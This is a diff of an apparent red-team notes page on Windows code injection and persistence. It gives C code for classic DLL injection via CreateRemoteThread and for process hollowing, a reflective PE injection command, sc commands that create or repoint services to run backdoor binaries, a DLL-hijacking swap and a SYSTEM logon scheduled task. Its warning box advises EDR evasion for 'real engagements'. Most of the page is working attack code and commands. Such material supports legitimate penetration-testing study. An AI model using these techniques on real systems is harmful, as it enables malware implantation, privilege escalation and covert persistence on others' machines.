@@ -1,11 +1,11 @@
+# DLL Injection & Malicious Services
+
 !!! warning "Watch out"
     Malicious services and DLL injection are heavily signatured by modern EDR. In real engagements, prefer LOLBin-based persistence (scheduled tasks, registry run keys, COM hijacking) over dropping new binaries.
 
-## DLL Injection Techniques
+---
 
-##### Classic DLL Injection
-
-This involves injecting a DLL into a running process using `LoadLibrary` or `CreateRemoteThread`.
+## Classic DLL Injection
 
 ```c
 #include <windows.h>
@@ -20,7 +20,7 @@ int main(int argc, char* argv[]) {
 
     void* pDllPath = VirtualAllocEx(hProcess, NULL, strlen(argv[2]) + 1, MEM_COMMIT, PAGE_READWRITE);
     WriteProcessMemory(hProcess, pDllPath, argv[2], strlen(argv[2]) + 1, NULL);
-    
+
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL);
     if (!hThread) {
         printf("Failed to create remote thread\n");
@@ -33,21 +33,19 @@ int main(int argc, char* argv[]) {
 }
 ```
 
-This code injects a specified DLL into a target process by writing the DLL path into the process's memory and executing `LoadLibraryA`.
+---
 
-##### Reflective DLL Injection
+## Reflective DLL Injection
 
-Reflective DLL injection allows loading a DLL directly into memory without writing it to disk. This method avoids detection by antivirus software.
-
-A common tool for reflective DLL injection is `mimikatz`:
+Loads a DLL directly into memory without writing to disk:
 
 ```powershell
 Invoke-ReflectivePEInjection -PEPath C:\payload.dll -ProcessID 1234
 ```
 
-##### Process Hollowing
+---
 
-Process hollowing is a technique where a legitimate process is launched in a suspended state, and its memory is replaced with malicious code.
+## Process Hollowing
 
 ```c
 #include <windows.h>
@@ -59,7 +57,7 @@ int main() {
 
     void* pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(pi.hProcess, pRemoteMemory, payload, payloadSize, NULL);
-    
+
     ResumeThread(pi.hThread);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
@@ -67,55 +65,40 @@ int main() {
 }
 ```
 
-This creates a suspended `svchost.exe` process, replaces its memory with a malicious payload, and resumes execution.
+---
 
-#### Malicious Services
+## Malicious Services
 
-Windows services provide a powerful way to establish persistence by registering a backdoor service that starts at boot.
-
-##### Creating a Malicious Service
+### Create a Backdoor Service
 
 ```powershell
 sc create BackdoorService binPath= "C:\Windows\System32\cmd.exe /c C:\payload.exe" start= auto
 sc start BackdoorService
 ```
 
-This registers a service that executes `payload.exe` on startup.
-
-##### Modifying an Existing Service
-
-If a writable service is found, its binary path can be modified to execute a backdoor.
+### Modify an Existing Service
 
 ```powershell
 sc config VulnerableService binPath= "C:\malicious.exe"
 sc start VulnerableService
 ```
 
-##### DLL Hijacking
+### DLL Hijacking via Service
 
-Many Windows services load DLLs from insecure directories. Replacing a DLL with a malicious version can grant execution with elevated privileges.
+1. Identify DLL loaded from unprotected path:
 
-Steps:
-
-1. Identify a DLL loaded by a service from an unprotected path:
-    
     ```powershell
     listdlls -accepteula | findstr "C:\Program Files\VulnerableApp\"
     ```
-    
-1. Replace the DLL with a malicious one:
-    
+
+2. Replace with malicious DLL:
+
     ```powershell
-    move C:\backdoor.dll C:\Program Files\VulnerableApp\legit.dll
+    move C:\backdoor.dll "C:\Program Files\VulnerableApp\legit.dll"
     ```
-    
 
-##### Scheduled Task Service Execution
-
-A service can be configured to execute a malicious task periodically.
+### Scheduled Task Service Execution
 
 ```powershell
 schtasks /create /tn "WinPersistence" /tr "C:\malicious.exe" /sc onlogon /ru SYSTEM
 ```
-
-This ensures execution every time a user logs in.
